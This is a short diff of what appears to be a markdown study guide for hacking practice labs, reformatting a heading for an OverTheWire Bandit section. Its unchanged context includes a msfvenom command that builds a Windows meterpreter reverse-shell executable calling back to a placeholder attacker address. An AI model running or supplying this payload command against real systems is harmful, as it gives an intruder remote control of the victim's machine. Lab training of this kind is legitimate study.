@@ -51,8 +51,9 @@ run
 
 # Generate payload with msfvenom
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > shell.exe
+---
 
-🔹 OverTheWire — Bandit (Level 0 → 15)
+###🔹 OverTheWire — Bandit (Level 0 → 15)
 Focus Areas
 SSH basics
 File permissions
